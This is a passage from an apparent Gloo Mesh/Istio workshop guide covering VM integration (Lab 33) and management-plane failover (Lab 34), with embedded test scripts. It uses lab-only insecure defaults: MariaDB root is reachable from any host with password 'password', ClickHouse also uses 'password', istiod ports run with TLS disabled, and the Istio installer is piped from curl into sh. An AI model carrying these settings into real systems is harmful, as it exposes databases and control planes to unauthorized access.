    expect(output.usage_plan).to.equals("gold");
    expect(output.api_product_id).to.equals("bookinfo");
    expect(output.user_id).to.equals("user1@example.com");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=150 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 33 - VM integration <a name="lab-33---vm-integration-"></a>

Let's see how we can configure a VM to be part of the Mesh.

To make it easier (and more fun), we'll use a Docker container to simulate a VM.

First of all, we need to define a few environment variables:

```bash
export VM_APP="vm1"
VM_NAMESPACE="virtualmachines"
WORK_DIR="vm1"
SERVICE_ACCOUNT="vm1-sa"
CLUSTER_NETWORK=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=eastwestgateway -ojson | jq -r '.items[0].metadata.labels["topology.istio.io/network"]')
VM_NETWORK="vm-network"
CLUSTER="${CLUSTER1}"
```

Then, we need to create a directory where we'll store all the files that need to be used in our VM:

```bash
rm -rf ${WORK_DIR}
mkdir -p ${WORK_DIR}
```

Expose the port 15012 and 15017 of istiod through the Istio Ingress Gateway:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.istio.io/v1beta1
kind: Gateway
metadata:
  name: istiod-gateway
  namespace: istio-gateways
spec:
  selector:
    istio: eastwestgateway
  servers:
    - port:
        name: tcp-istiod
        number: 15012
        protocol: TCP
      hosts:
        - "*"
    - port:
        name: tcp-istiodwebhook
        number: 15017
        protocol: TCP
      hosts:
        - "*"
---
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: istiod-vs
  namespace: istio-gateways
spec:
  hosts:
  - istiod-1-18.istio-system.svc.cluster.local
  gateways:
  - istiod-gateway
  tcp:
  - match:
    - port: 15012
    route:
    - destination:
        host: istiod-1-18.istio-system.svc.cluster.local
        port:
          number: 15012
  - match:
    - port: 15017
    route:
    - destination:
        host: istiod-1-18.istio-system.svc.cluster.local
        port:
          number: 443
---
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: istiod-dr
  namespace: istio-gateways
spec:
  host: istiod-1-18.istio-system.svc.cluster.local
  trafficPolicy:
    portLevelSettings:
    - port:
        number: 15012
      tls:
        mode: DISABLE
    - port:
        number: 15017
      tls:
        mode: DISABLE

EOF
```

Create a Gateway resource that allows application traffic from the VMs to route correctly:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.istio.io/v1beta1
kind: Gateway
metadata:
  name: cross-network-gateway
  namespace: istio-gateways
spec:
  selector:
    istio: eastwestgateway
  servers:
  - port:
      number: 15443
      name: tls
      protocol: TLS
    tls:
      mode: AUTO_PASSTHROUGH
    hosts:
    - "*.local"
EOF
```

Create the namespace that will host the virtual machine:

```bash
kubectl --context ${CLUSTER1} create namespace "${VM_NAMESPACE}"
```

Create a serviceaccount for the virtual machine:

```bash
kubectl --context ${CLUSTER1} create serviceaccount "${SERVICE_ACCOUNT}" -n "${VM_NAMESPACE}"
```

Create a the WorkloadGroup yaml for the VM:

```bash
cat <<'EOF' > workloadgroup.yaml
apiVersion: networking.istio.io/v1alpha3
kind: WorkloadGroup
metadata:
  name: "${VM_APP}"
  namespace: "${VM_NAMESPACE}"
spec:
  metadata:
    labels:
      app: "${VM_APP}"
  template:
    serviceAccount: "${SERVICE_ACCOUNT}"
    network: "${VM_NETWORK}"
EOF
```

Download istio 1.18.3:

```bash
export ISTIO_VERSION=1.18.3
curl -L https://istio.io/downloadIstio | sh -
```

Use the istioctl x workload entry command to generate:

- cluster.env: Contains metadata that identifies what namespace, service account, network CIDR and (optionally) what inbound ports to capture.
- istio-token: A Kubernetes token used to get certs from the CA.
- mesh.yaml: Provides additional Istio metadata including, network name, trust domain and other values.
- root-cert.pem: The root certificate used to authenticate.
- hosts: An addendum to /etc/hosts that the proxy will use to reach istiod for xDS.*

```bash
./istio-1.18.3/bin/istioctl --context ${CLUSTER1} x workload entry configure -f workloadgroup.yaml -o "${WORK_DIR}" --clusterID "${CLUSTER}" -r 1-18
```

Run a Docker container that we'll use to simulate a VM:

```bash
docker run -d --name vm1 --network kind --privileged -v `pwd`/vm1:/vm ubuntu:18.04 bash -c 'sleep 360000'
```

Install the dependencies:

```bash
docker exec vm1 apt update -y
docker exec vm1 apt-get install -y iputils-ping curl iproute2 iptables python sudo
```

Create routes to allow the VM to access the Pods on the 2 Kubernetes clusters:

```bash
cluster1_cidr=$(kubectl --context ${CLUSTER1} -n kube-system get pod -l component=kube-controller-manager -o jsonpath='{.items[0].spec.containers[0].command}' | jq -r '.[] | select(. | startswith("--cluster-cidr="))' | cut -d= -f2)
cluster2_cidr=$(kubectl --context ${CLUSTER2} -n kube-system get pod -l component=kube-controller-manager -o jsonpath='{.items[0].spec.containers[0].command}' | jq -r '.[] | select(. | startswith("--cluster-cidr="))' | cut -d= -f2)

docker exec vm1 $(kubectl --context ${CLUSTER1} get nodes -o=jsonpath='{range .items[*]}{"ip route add "}{"'${cluster1_cidr}' via "}{.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}')
docker exec vm1 $(kubectl --context ${CLUSTER2} get nodes -o=jsonpath='{range .items[*]}{"ip route add "}{"'${cluster2_cidr}' via "}{.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}')
```

Add an entry in the hosts file to resolve the address of istiod by the IP address of the Istio Ingress Gateway:

```bash
echo "$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-eastwestgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}') istiod.istio-system.svc istiod-1-18.istio-system.svc" > "${WORK_DIR}"/hosts
```

Install the root certificate at /var/run/secrets/istio:

```bash
docker exec vm1 mkdir -p /etc/certs
docker exec vm1 cp /vm/root-cert.pem /etc/certs/root-cert.pem
```

Install the token at /var/run/secrets/tokens:

```bash
docker exec vm1 mkdir -p /var/run/secrets/tokens
docker exec vm1 cp /vm/istio-token /var/run/secrets/tokens/istio-token
```

Install the deb package containing the Istio virtual machine integration runtime:

```bash
docker exec vm1 curl -LO https://storage.googleapis.com/istio-release/releases/1.18.3/deb/istio-sidecar.deb
docker exec vm1 dpkg -i istio-sidecar.deb
```

Install cluster.env within the directory /var/lib/istio/envoy/:

```bash
docker exec vm1 cp /vm/cluster.env /var/lib/istio/envoy/cluster.env
```

Install the Mesh Config to /etc/istio/config/mesh:

```bash
docker exec vm1 cp /vm/mesh.yaml /etc/istio/config/mesh
```

Add the istiod host to /etc/hosts:

```bash
docker exec vm1 bash -c 'cat /vm/hosts >> /etc/hosts'
```

Transfer ownership to the Istio proxy:

```bash
docker exec vm1 mkdir -p /etc/istio/proxy
docker exec vm1 chown -R istio-proxy /var/lib/istio /etc/certs /etc/istio/proxy /etc/istio/config /var/run/secrets /etc/certs/root-cert.pem
```

Update the DNS configuration:

```bash
docker exec vm1 bash -c "sed 's/127.0.0.11/8.8.8.8/' /etc/resolv.conf > /vm/resolv.conf"
docker exec vm1 cp /vm/resolv.conf /etc/resolv.conf
```

Start the Istio agent:

```bash
docker exec -d vm1 bash /usr/local/bin/istio-start.sh
```

Let's update the bookinfo `Workspace` to include the `virtualmachines` namespace of the first cluster:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: bookinfo
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
    - name: virtualmachines
  - name: cluster2
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
EOF
```

Take a look at the Envoy clusters:

```bash
docker exec vm1 curl -v localhost:15000/clusters | grep productpage.bookinfo-frontends.svc.cluster.local
```

It should return several lines similar to the one below:

```
outbound|9080||productpage.bookinfo-frontends.svc.cluster.local::172.18.2.1:15443::cx_active::0
```

You can see that the IP address corresponds to the IP address of the Istio Ingress Gateway.

You should now be able to reach the product page application from the VM:

```bash
docker exec vm1 curl -I productpage.bookinfo-frontends.svc.cluster.local:9080/productpage
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("The VM should be able to access the productpage service", () => {
  const command = 'docker exec vm1 curl -s -o /dev/null -w "%{http_code}" productpage.bookinfo-frontends.svc.cluster.local:9080/productpage';
  it("Got the expected status code 200", () => helpers.genericCommand({ command: command, responseContains: "200" }));
})

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/vm-integration/tests/vm-access-productpage.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Now, let's do the opposite and access an application running in the VM from a Pod.

Run the following command to start a web server:

```bash
docker exec -d vm1 python -m SimpleHTTPServer 9999
```

Get the IP address of the container and create the ServiceEntry and WorkloadEntry:

```bash
VM_IP=$(docker inspect vm1 | jq -r '.[0].NetworkSettings.Networks.kind.IPAddress')

cat <<EOF | kubectl --context ${CLUSTER1} apply -f -
apiVersion: networking.istio.io/v1beta1
kind: ServiceEntry
metadata:
  name: ${VM_APP}
  namespace: virtualmachines
spec:
  hosts:
  - ${VM_APP}.virtualmachines.svc.cluster.local
  location: MESH_INTERNAL
  ports:
  - number: 9999
    name: http-vm
    protocol: TCP
    targetPort: 9999
  resolution: STATIC
  workloadSelector:
    labels:
      app: ${VM_APP}
EOF

cat <<EOF | kubectl --context ${CLUSTER1} apply -f -
apiVersion: networking.istio.io/v1beta1
kind: WorkloadEntry
metadata:
  name: ${VM_APP}
  namespace: virtualmachines
spec:
  network: ${CLUSTER_NETWORK}
  address: ${VM_IP}
  labels:
    app: ${VM_APP}
  serviceAccount: ${SERVICE_ACCOUNT}
EOF
```

Try to access the app from the `productpage` Pod:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends exec $(kubectl --context ${CLUSTER1} -n bookinfo-frontends get pods -l app=productpage -o jsonpath='{.items[0].metadata.name}') -- python -c "import requests; r = requests.get('http://${VM_APP}.virtualmachines.svc.cluster.local:9999'); print(r.text)"
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("The productpage service should be able to access the VM", () => {
  const podName = helpers.getOutputForCommand({ command: "kubectl -n bookinfo-frontends get pods -l app=productpage -o jsonpath='{.items[0].metadata.name}' --context " + process.env.CLUSTER1 }).replaceAll("'", "");
  const command = "kubectl -n bookinfo-frontends exec " + podName + " --context " + process.env.CLUSTER1 + " -- python -c \"import requests; r = requests.get('http://" + process.env.VM_APP + ".virtualmachines.svc.cluster.local:9999'); print(r.status_code)\"";
  it('Got the expected status code 200', () => helpers.genericCommand({ command: command, responseContains: "200" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/vm-integration/tests/productpage-access-vm.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Finally, let's deploy MariaDB in the VM and configure the ratings service to use it as a backend.

```bash
docker exec vm1 apt-get update
docker exec vm1 apt-get install -y mariadb-server
```

We need to configure the database properly:

```bash
docker exec vm1 sed -i '/bind-address/c\bind-address  = 0.0.0.0' /etc/mysql/mariadb.conf.d/50-server.cnf
docker exec vm1 /etc/init.d/mysql start

docker exec -i vm1 mysql <<EOF
# Grant access to root
GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' IDENTIFIED BY 'password' WITH GRANT OPTION;
# Grant root access to other IPs
CREATE USER 'root'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
SELECT host, user FROM mysql.user;
EOF

docker exec vm1 /etc/init.d/mysql restart
docker exec vm1 curl -LO https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/src/mysql/mysqldb-init.sql
docker exec vm1 sh -c 'mysql -u root -ppassword < mysqldb-init.sql'
```

We can check that the `ratings` table is correctly configured:

```bash
docker exec vm1 mysql -u root -ppassword test -e "select * from ratings;"
```

Let's update the ServiceEntry:

```bash
cat <<EOF | kubectl --context ${CLUSTER1} apply -f -
apiVersion: networking.istio.io/v1beta1
kind: ServiceEntry
metadata:
  name: ${VM_APP}
  namespace: virtualmachines
spec:
  hosts:
  - ${VM_APP}.virtualmachines.svc.cluster.local
  location: MESH_INTERNAL
  ports:
  - number: 3306
    name: tcp-db
    protocol: TCP
    targetPort: 3306
  resolution: STATIC
  workloadSelector:
    labels:
      app: ${VM_APP}
EOF
```

Deploy a new version of the ratings service that is using the database and scale down the current version:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f ./istio-1.18.3/samples/bookinfo/platform/kube/bookinfo-ratings-v2-mysql-vm.yaml
kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/ratings-v2-mysql-vm MYSQL_DB_HOST=${VM_APP}.virtualmachines.svc.cluster.local
kubectl --context ${CLUSTER1} -n bookinfo-backends set serviceaccount deploy/ratings-v2-mysql-vm bookinfo-ratings
pod=$(kubectl --context ${CLUSTER1} -n bookinfo-backends get pods -l "app=ratings,version=v1" -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${CLUSTER1} -n bookinfo-backends scale deploy/ratings-v1 --replicas=0
kubectl --context ${CLUSTER1} -n bookinfo-backends wait --for=delete pod/$pod
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("The ratings service should use the database running on the VM", () => {
  it('Got reviews v2 with ratings in cluster1', () => helpers.checkBody({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', body: 'color="black"', match: true }));
})

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/vm-integration/tests/ratings-using-vm.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Let's delete the objects we've created:

```bash
kubectl --context ${CLUSTER1} -n istio-gateways delete gateways.networking.istio.io istiod-gateway
kubectl --context ${CLUSTER1} -n istio-gateways delete virtualservice istiod-vs
kubectl --context ${CLUSTER1} -n istio-gateways delete destinationrule istiod-dr
kubectl --context ${CLUSTER1} -n istio-gateways delete gateways.networking.istio.io cross-network-gateway
kubectl --context ${CLUSTER1} -n "${VM_NAMESPACE}" delete serviceaccount "${SERVICE_ACCOUNT}"
kubectl --context ${CLUSTER1} -n "${VM_NAMESPACE}" delete serviceentry ${VM_APP}
kubectl --context ${CLUSTER1} -n "${VM_NAMESPACE}" delete workloadentry ${VM_APP}
kubectl --context ${CLUSTER1} delete namespace "${VM_NAMESPACE}"
kubectl --context ${CLUSTER1} -n bookinfo-backends delete -f ./istio-1.18.3/samples/bookinfo/platform/kube/bookinfo-ratings-v2-mysql-vm.yaml
kubectl --context ${CLUSTER1} -n bookinfo-backends scale deploy/ratings-v1 --replicas=1
```

Let's apply the original Workspace:

```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: bookinfo
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
  - name: cluster2
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
EOF
```

And let's delete the Docker container which represents the VM:

```bash
docker rm -f vm1
```



## Lab 34 - Gloo Mesh Management Plane failover <a name="lab-34---gloo-mesh-management-plane-failover-"></a>


Before we start the failover procedure, let's capture the current output snapshot:

```shell
pod=$(kubectl --context ${MGMT} -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${MGMT} -n gloo-mesh debug -q -i ${pod} --image=curlimages/curl -- curl -s http://localhost:9091/snapshots/output > output
```

We can use it later to check the translation produces the same output on the new management plane.

Also, let's capture all Istio objects as well:

```bash
kubectl --context ${CLUSTER1} get istio-io -A -o json > cluster1_original
kubectl --context ${CLUSTER2} get istio-io -A -o json > cluster2_original
```

We can use it later to check the failover hasn't impacted the Istio configuration (no objects have been modified).
We're going to deploy a new Kubernetes cluster to host the standby Gloo Platform management plane:

```bash
./scripts/deploy-aws.sh 4 mgmt2
```

Then, run the following commands to wait for all the Pods to be ready:

```bash
./scripts/check.sh mgmt2
```

We also need to create a new environment variable:
```bash
export MGMT2=mgmt2
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Clusters are healthy", () => {
    const clusters = [process.env.MGMT2];
    clusters.forEach(cluster => {
        it(`Cluster ${cluster} is healthy`, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "default", k8sType: "service", k8sObj: "kubernetes" }));
    });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/gloo-mesh-mgmt-failover/tests/cluster-healthy.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
Copy the relay secrets used by the previous management plane to the new one:

```bash
kubectl --context ${MGMT2} create ns gloo-mesh
kubectl --context ${MGMT} -n gloo-mesh get secret relay-identity-token-secret -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get secret relay-root-tls-secret -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get secret relay-server-tls-secret -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get secret relay-tls-signing-secret -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get secret clickhouse-auth -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
```

After that, we can deploy Gloo Platform on this cluster.

Run the following commands to deploy the Gloo Platform management plane (and scale it down):

```bash
helm repo add gloo-platform https://storage.googleapis.com/gloo-platform/helm-charts
helm repo update
kubectl --context ${MGMT2} create ns gloo-mesh
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds \
--namespace gloo-mesh \
--kube-context ${MGMT2} \
--version=2.4.6
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
--namespace gloo-mesh \
--kube-context ${MGMT2} \
--version=2.4.6 \
 -f -<<EOF
licensing:
  licenseKey: ${GLOO_MESH_LICENSE_KEY}
common:
  cluster: mgmt
glooMgmtServer:
  enabled: true
  ports:
    healthcheck: 8091
prometheus:
  enabled: true
redis:
  deployment:
    enabled: true
clickhouse:
  enabled: true
  persistence:
    enabled: false
telemetryGateway:
  enabled: true
  service:
    type: LoadBalancer
telemetryGatewayCustomization:
  pipelines:
    logs/clickhouse:
      enabled: true
  extraExporters:
    clickhouse:
      password: password
glooUi:
  enabled: true
  serviceType: LoadBalancer
telemetryCollector:
  enabled: true
EOF
kubectl --context ${MGMT2} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server

kubectl --context ${MGMT2} -n gloo-mesh scale deploy/gloo-mesh-mgmt-server --replicas=0
```

Finally, you need to specify which gateways you want to use for cross cluster traffic:

```bash
cat <<EOF | kubectl --context ${MGMT2} apply -f -
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: global
  namespace: gloo-mesh
spec:
  options:
    eastWestGateways:
      - selector:
          labels:
            istio: eastwestgateway
EOF
```

Copy the `KubernetesCluster` objects from the previous management plane to the new one:

```bash
kubectl --context ${MGMT} -n gloo-mesh get KubernetesCluster cluster1 -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get KubernetesCluster cluster2 -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
```

Copy the secret containing the root CA certificate used by the previous management plane to the new one:

```bash
kubectl --context ${MGMT} -n gloo-mesh get secret root-trust-policy.gloo-mesh -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
```

Copy the `IstioLifecycleManager` and `GatewayLifecycleManager` objects from the previous management plane to the new one:

```bash
kubectl --context ${MGMT} -n gloo-mesh get IstioLifecycleManager cluster1-installation -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get IstioLifecycleManager cluster2-installation -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get GatewayLifecycleManager cluster1-ingress -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get GatewayLifecycleManager cluster1-eastwest -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get GatewayLifecycleManager cluster2-ingress -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
kubectl --context ${MGMT} -n gloo-mesh get GatewayLifecycleManager cluster2-eastwest -o yaml | kubectl --context ${MGMT2} -n gloo-mesh apply -f -
```

Create the following `RootTrustPolicy` object which will create the new `cacerts` secret using the previous root CA certificate.

```bash
cat << EOF | kubectl --context ${MGMT2} apply -f -
apiVersion: admin.gloo.solo.io/v2
kind: RootTrustPolicy
metadata:
  name: root-trust-policy
  namespace: gloo-mesh
spec:
  config:
    mgmtServerCa:
      secretRef:
        name: root-trust-policy.gloo-mesh
        namespace: gloo-mesh
    autoRestartPods: false
EOF
```

Let's create the `gateways` workspace which corresponds to the `istio-gateways` and the `gloo-mesh-addons` namespaces on the cluster(s):

```bash
kubectl apply --context ${MGMT2} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: gateways
  namespace: gloo-mesh
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: istio-gateways
    - name: gloo-mesh-addons
  - name: cluster2
    namespaces:
    - name: istio-gateways
    - name: gloo-mesh-addons
EOF
```

Let's create the `bookinfo` workspace which corresponds to the `bookinfo-frontends` and `bookinfo-backends` namespaces on the cluster(s):

```bash
kubectl apply --context ${MGMT2} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: bookinfo
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
  - name: cluster2
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
EOF
```

Let's create the `httpbin` workspace which corresponds to the `httpbin` namespace on `cluster1`:

```bash
kubectl apply --context ${MGMT2} -f- <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: httpbin
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: httpbin
EOF
```

Then, you need to set the environment variable to tell the Gloo Platform agents how to communicate with the management plane:

```bash
export ENDPOINT_GLOO_MESH=$(kubectl --context ${MGMT2} -n gloo-mesh get svc gloo-mesh-mgmt-server -o jsonpath='{.status.loadBalancer.ingress[0].*}'):9900
export HOST_GLOO_MESH=$(echo ${ENDPOINT_GLOO_MESH%:*})
export ENDPOINT_TELEMETRY_GATEWAY=$(kubectl --context ${MGMT2} -n gloo-mesh get svc gloo-telemetry-gateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):4317
```

Now, let's update the agents to use the new management plane.

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: KubernetesCluster
metadata:
  name: cluster1
  namespace: gloo-mesh
spec:
  clusterDomain: cluster.local
EOF
kubectl --context ${CLUSTER1} create ns gloo-mesh
kubectl get secret relay-root-tls-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.ca\.crt}' | base64 -d > ca.crt
kubectl create secret generic relay-root-tls-secret -n gloo-mesh --context ${CLUSTER1} --from-file ca.crt=ca.crt
rm ca.crt

kubectl get secret relay-identity-token-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.token}' | base64 -d > token
kubectl create secret generic relay-identity-token-secret -n gloo-mesh --context ${CLUSTER1} --from-file token=token
rm token
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds  \
--namespace=gloo-mesh \
--kube-context=${CLUSTER1} \
--version=2.4.6
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace=gloo-mesh \
  --kube-context=${CLUSTER1} \
  --version=2.4.6 \
 -f -<<EOF
common:
  cluster: cluster1
glooAgent:
  enabled: true
  relay:
    serverAddress: "${ENDPOINT_GLOO_MESH}"
    authority: gloo-mesh-mgmt-server.gloo-mesh
telemetryCollector:
  presets:
    logsCollection:
      enabled: true
      storeCheckpoints: true
  enabled: true
  config:
    exporters:
      otlp:
        endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
telemetryCollectorCustomization:
  pipelines:
    logs/istio_access_logs:
      enabled: true
  extraExporters:
    clickhouse:
      password: password
EOF

kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: KubernetesCluster
metadata:
  name: cluster2
  namespace: gloo-mesh
spec:
  clusterDomain: cluster.local
EOF
kubectl --context ${CLUSTER2} create ns gloo-mesh
kubectl get secret relay-root-tls-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.ca\.crt}' | base64 -d > ca.crt
kubectl create secret generic relay-root-tls-secret -n gloo-mesh --context ${CLUSTER2} --from-file ca.crt=ca.crt
rm ca.crt

kubectl get secret relay-identity-token-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.token}' | base64 -d > token
kubectl create secret generic relay-identity-token-secret -n gloo-mesh --context ${CLUSTER2} --from-file token=token
rm token
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds  \
--namespace=gloo-mesh \
--kube-context=${CLUSTER2} \
--version=2.4.6
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace=gloo-mesh \
  --kube-context=${CLUSTER2} \
  --version=2.4.6 \
 -f -<<EOF
common:
  cluster: cluster2
glooAgent:
  enabled: true
  relay:
    serverAddress: "${ENDPOINT_GLOO_MESH}"
    authority: gloo-mesh-mgmt-server.gloo-mesh
telemetryCollector:
  presets:
    logsCollection:
      enabled: true
      storeCheckpoints: true
  enabled: true
  config:
    exporters:
      otlp:
        endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
telemetryCollectorCustomization:
  pipelines:
    logs/istio_access_logs:
      enabled: true
  extraExporters:
    clickhouse:
      password: password
EOF
```

Let's scale up the management plane:

```bash
kubectl --context ${MGMT2} -n gloo-mesh scale deploy/gloo-mesh-mgmt-server --replicas=1
```

And update the variables to use the new management plane from now on:
```bash
export MGMT=${MGMT2}
```
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Cluster registration", () => {
  it("cluster1 is registered", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
    expect(command).to.contain("cluster1");
  });
  it("cluster2 is registered", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
    expect(command).to.contain("cluster2");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/gloo-mesh-mgmt-failover/../deploy-and-register-gloo-mesh/tests/cluster-registration.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Finally we can check that the istio objects are the same as before the failover:

```bash
kubectl --context ${CLUSTER1} get istio-io -A -o json > cluster1_final
kubectl --context ${CLUSTER2} get istio-io -A -o json > cluster2_final
```
<!--bash
ATTEMPTS=1
until [[ $(jq -r '.items|length' cluster1_final) -ge 1 ]] || [ $ATTEMPTS -gt 12 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 10
  kubectl --context ${CLUSTER1} get istio-io -A -o json > cluster1_final
done
ATTEMPTS=1
until [[ $(jq -r '.items|length' cluster2_final) -ge 1 ]] || [ $ATTEMPTS -gt 12 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 10
  kubectl --context ${CLUSTER2} get istio-io -A -o json > cluster2_final
done

npm install -g json-diff
json-diff -x metadata cluster1_original cluster1_final
json-diff -x metadata cluster2_original cluster2_final

-->
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var fs = require("fs-extra");
var jsonDiff = require('json-diff');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
